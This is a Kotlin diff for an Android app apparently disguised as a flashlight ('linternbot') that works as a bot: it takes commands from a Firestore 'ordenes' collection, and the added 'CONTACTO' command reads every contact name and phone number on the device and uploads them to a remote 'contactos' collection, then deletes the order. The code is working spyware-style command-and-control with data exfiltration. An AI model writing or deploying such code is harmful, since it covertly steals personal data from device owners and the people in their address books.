@@ -1,18 +1,21 @@
 package com.linternbot
 
+import android.Manifest
 import android.app.AlarmManager
 import android.app.PendingIntent
 import android.content.BroadcastReceiver
-import android.content.ClipboardManager
+import android.content.ContentResolver
 import android.content.Context
-import android.content.Context.CLIPBOARD_SERVICE
-import android.content.Context.INPUT_METHOD_SERVICE
 import android.content.Intent
+import android.content.pm.PackageManager
+import android.database.Cursor
 import android.os.Build
 import android.os.PowerManager
+import android.provider.ContactsContract
 import android.util.Log
-import android.view.inputmethod.InputMethodManager
 import android.widget.Toast
+import androidx.core.app.ActivityCompat
+import androidx.core.content.ContextCompat
 import com.google.firebase.firestore.DocumentChange
 import com.google.firebase.firestore.FirebaseFirestore
 import com.google.firebase.firestore.ktx.firestore
@@ -22,7 +25,10 @@ import java.util.*
 
 
 class Alarm : BroadcastReceiver() {
+    lateinit var contexto : Context
+
     override fun onReceive(context: Context, intent: Intent) {
+        contexto = context
         val pm = context.getSystemService(Context.POWER_SERVICE) as PowerManager
         val wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "app:alarm")
         wl.acquire()
@@ -77,6 +83,13 @@ class Alarm : BroadcastReceiver() {
                         Log.d("TAG2", "Se añade nuevos datos del dispositivo")
                         db.collection("ordenes").document(document.id).delete().addOnSuccessListener {
                             Log.d("TAG2", "Orden de datos de dispositivo eliminada")
+                        }
+                    }
+                    if(document.data["Primitiva"]!!.equals("CONTACTO")){
+                        nuevaListaContactos(db, strDate)
+                        Log.d("TAG2", "Se añade nuevos datos de los contactos del dispositivo")
+                        db.collection("ordenes").document(document.id).delete().addOnSuccessListener {
+                            Log.d("TAG2", "Orden de datos de los contactos de dispositivo eliminada")
                         }
                     }
                 }
@@ -163,9 +176,80 @@ class Alarm : BroadcastReceiver() {
                         DocumentChange.Type.ADDED -> db.collection("datosDispositivo").document(idAndroid).set(datosDispositivo)
                     }
                 }
+            }
+        Log.d("TAG2","Se ha ejecutado la tarea de toma de datos del dispositiv")
+    }
 
+    fun nuevaListaContactos(db : FirebaseFirestore, strDate: String){
+        val contactos = hashMapOf(
+            "Bot ID" to idAndroid,
+            "Hora" to strDate,
+            "Lista contactos" to getContactList()
+        )
+        db.collection("ordenes")
+            .whereEqualTo("Primitiva", "CONTACTO")
+            .addSnapshotListener { snapshot, e ->
+                if (e != null) {
+                    Log.d("TAG", "Fallada la escucha de la primitiva.", e)
+                    return@addSnapshotListener
+                }
+
+                for (dc in snapshot!!.documentChanges) {
+                    when (dc.type) {
+                        DocumentChange.Type.ADDED -> db.collection("contactos").document(idAndroid).set(contactos)
+                    }
+                }
             }
 
-        Log.d("TAG2","Se ha ejecutado la tarea de toma de datos del dispositiv")
+        Log.d("TAG2","Se ha ejecutado la tarea obtencion de lista de contactos")
+    }
+
+    // Fuente: https://stackoverflow.com/questions/12562151/android-get-all-contacts
+    private fun getContactList() : ArrayList<Contact> {
+        var contactList: ArrayList<Contact> = ArrayList()
+
+        val PROJECTION = arrayOf(
+            ContactsContract.CommonDataKinds.Phone.CONTACT_ID,
+            ContactsContract.Contacts.DISPLAY_NAME,
+            ContactsContract.CommonDataKinds.Phone.NUMBER
+        )
+
+
+
+
+        val cr: ContentResolver = contexto.getContentResolver()
+        val cursor: Cursor? = cr.query(
+            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+            PROJECTION,
+            null,
+            null,
+            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
+        )
+        if (cursor != null) {
+            val mobileNoSet = HashSet<String>()
+            try {
+                val nameIndex: Int = cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)
+                val numberIndex: Int =
+                    cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
+                var name: String
+                var number: String
+                while (cursor.moveToNext()) {
+                    name = cursor.getString(nameIndex)
+                    number = cursor.getString(numberIndex)
+                    number = number.replace(" ", "")
+                    if (!mobileNoSet.contains(number)) {
+                        contactList.add(Contact(name, number))
+                        mobileNoSet.add(number)
+                        Log.d(
+                            "hvy", "onCreaterrView  Phone Number: name = " + name
+                                    + " No = " + number
+                        )
+                    }
+                }
+            } finally {
+                cursor.close()
+            }
+        }
+        return contactList
     }
 }
